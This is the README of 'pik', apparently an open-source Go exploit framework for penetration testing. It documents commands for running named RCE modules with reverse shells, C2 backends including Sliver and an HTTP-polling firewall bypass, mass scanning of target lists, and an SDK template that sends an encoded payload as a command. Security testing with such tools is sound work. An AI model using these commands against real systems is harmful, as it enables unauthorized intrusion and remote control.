# pik

[![CI](https://github.com/Chocapikk/pik/actions/workflows/ci.yml/badge.svg)](https://github.com/Chocapikk/pik/actions/workflows/ci.yml)
[![Coverage](https://img.shields.io/badge/coverage-97.1%25-brightgreen)](https://github.com/Chocapikk/pik/actions/workflows/ci.yml)
[![Release](https://img.shields.io/github/v/release/Chocapikk/pik)](https://github.com/Chocapikk/pik/releases/latest)
[![License](https://img.shields.io/github/license/Chocapikk/pik)](LICENSE)

Go exploit framework. Write exploits once, run them as standalone binaries or inside the framework with an interactive console.

## Install

```bash
go install github.com/Chocapikk/pik/cmd/pik@latest
```

Or self-update an existing install:

```bash
pik update
```

## Usage

```bash
pik                                                # Interactive readline console (default)
pik console                                        # Same as above
pik tui                                            # TUI dashboard with tabs
pik run opendcim_sqli_rce -t target -s LHOST=ip    # Run an exploit
pik check opendcim_sqli_rce -t target              # Check only
pik info opendcim_sqli_rce                         # Module details + dorks
pik build opendcim_sqli_rce -o opendcim            # Standalone binary
pik list                                           # List all modules
pik lab run langflow_validate_code_rce             # Start lab + exploit (zero config)
pik lab status                                     # List running labs
```

## Console

```
pik > use opendcim_sqli_rce
pik opendcim_sqli_rce > show options
pik opendcim_sqli_rce > set TARGET http://target
pik opendcim_sqli_rce > set LHOST 10.0.0.1
pik opendcim_sqli_rce > check
pik opendcim_sqli_rce > exploit
>> Session 1 opened (10.0.0.2:49326)
www-data@target:~$ ^Z
>> Session 1 backgrounded
pik opendcim_sqli_rce > sessions
pik opendcim_sqli_rce > kill 1
```

Commands: `use`, `back`, `show options|advanced|payloads|targets|modules`, `set`, `unset`, `target`, `check`, `exploit`, `lab start|stop|status|run`, `sessions`, `kill`, `search`, `info`, `resource`, `list`, `rank`, `clear`, `help`.

Ctrl+Z backgrounds a session. `use <id>` selects a module by index. `resource exploit.rc` runs commands from a file. History persists across sessions.

## TUI dashboard

```bash
pik tui
```

Tab-based dashboard with mouse and keyboard support:

- **F1 Browse** - Module table with search bar, reliability, check support, CVEs
- **F2 Config** - Inline option editing, action buttons (Check, Exploit, Lab), advanced toggle
- **F3 Sessions** - Session list with Interact/Kill actions

Output viewport is always visible at the bottom. Click to switch between TUI and console input zones. The TUI and console share the same business logic - standalone binaries don't pull TUI dependencies.

## Lab environments

Modules can declare Docker lab environments. One command to go from zero to shell:

```bash
pik lab run langflow_validate_code_rce             # Start lab, wait ready, exploit, shell
pik lab start langflow_validate_code_rce           # Just start the lab
pik lab status                                     # List running labs
pik lab stop langflow_validate_code_rce            # Tear down
```

The `lab run` flow: pull image, create container, wait for TCP, probe with `Check()` until the app responds, auto-detect LHOST from Docker gateway, run exploit, pop shell. Zero configuration.

Labs bind to `127.0.0.1` only (never exposed to the network). Services get DNS aliases for inter-container resolution, health checks for startup ordering, and restart policies.

Declaring a lab in a module:

```go
Lab: sdk.Lab{
    Services: []sdk.Service{
        sdk.NewLabService("db", "mysql:5.7").
            WithEnv("MYSQL_ROOT_PASSWORD", sdk.Rand("db_pass")).
            WithHealthcheck("mysqladmin ping -h localhost"),
        sdk.NewLabService("web", "wordpress:6.4", "80").
            WithEnv("WORDPRESS_DB_HOST", "db").
            WithEnv("WORDPRESS_DB_PASSWORD", sdk.Rand("db_pass")),
    },
},
```

`sdk.Rand("label")` generates a random value at lab start. Same label across services resolves to the same value (shared credentials). Host ports are always randomized by the framework to avoid conflicts.

## C2 backends

Three built-in backends, plus Sliver integration:

```bash
# TCP reverse shell (default)
pik run opendcim_sqli_rce -t target -s LHOST=ip

# TLS encrypted
pik run opendcim_sqli_rce -t target -s LHOST=ip -s C2=sslshell

# HTTP polling (firewall bypass)
pik run opendcim_sqli_rce -t target -s LHOST=ip -s C2=httpshell -s PAYLOAD=reverse_php_http

# Sliver C2
pik run opendcim_sqli_rce -t target -s LHOST=ip -s C2=sliver -s C2CONFIG=~/.sliver/configs/operator.cfg
```

## Scanning

```bash
pik check opendcim_sqli_rce -f targets.txt --threads 50 -o vulnerable.txt
pik check opendcim_sqli_rce -f targets.txt --threads 50 -o results.json --json
```

Supports HTTP/SOCKS5 proxy with `-s PROXIES=socks5://127.0.0.1:1080`.

## Standalone binaries

Any module can be compiled into a self-contained binary with check, exploit, scanner, reverse shell listener, and optional lab support built in:

```bash
pik build opendcim_sqli_rce -o opendcim
./opendcim --help
./opendcim -t target -s LHOST=10.0.0.1                      # Exploit
./opendcim -t target --check                                 # Check only
./opendcim -f targets.txt --threads 50 -o vulns.txt --check  # Mass scan
```

All module options are passed via `-s KEY=VALUE`. Run `--help` to see available options.

## Write your own exploit

```go
package main

import (
    "github.com/Chocapikk/pik/sdk"
    _ "github.com/Chocapikk/pik/pkg/cli"
)

type MyExploit struct{ sdk.Pik }

func (m *MyExploit) Info() sdk.Info {
    return sdk.Info{
        Description: "My exploit",
        Authors:     sdk.Authors(sdk.NewAuthor("Your Name").WithHandle("handle")),
        Reliability: sdk.Typical,
        Targets:     []sdk.Target{sdk.TargetLinux("amd64")},
    }
}

func (m *MyExploit) Check(run *sdk.Context) (sdk.CheckResult, error) {
    resp, err := run.Send(sdk.HTTPRequest{Path: "vulnerable.php"})
    if err != nil {
        return sdk.Unknown(err)
    }
    if resp.ContainsAny("marker") {
        return sdk.Vulnerable("marker found")
    }
    return sdk.Safe("not vulnerable")
}

func (m *MyExploit) Exploit(run *sdk.Context) error {
    cmd := run.CommentTrail(run.Base64Bash(run.Payload()))
    _, err := run.Send(sdk.HTTPRequest{
        Method: "POST",
        Path:   "rce.php",
        Form:   sdk.Values{"cmd": {cmd}},
    })
    return err
}

func main() {
    sdk.Run(&MyExploit{})
}
```

```bash
go build -o myexploit .
./myexploit -t http://target -s LHOST=10.0.0.1
```

## Supply chain security

Release binaries are signed with minisign. `pik update` verifies the signature and checksum before replacing itself. The signing public key is embedded in the binary.

## Build from source

```bash
make build                   # Dev build
make build VERSION=1.0.0     # Versioned build
make static                  # Static binary (CGO_ENABLED=0)
make install                 # Install to $GOPATH/bin
make test                    # Run tests
make vet                     # Lint
```

## License

AGPL-3.0. Free to use for pentesting, research, CTFs, and internal security work. If you build a commercial product or service on top of pik, the AGPL requires you to open-source your entire codebase. Contact the author for commercial licensing.
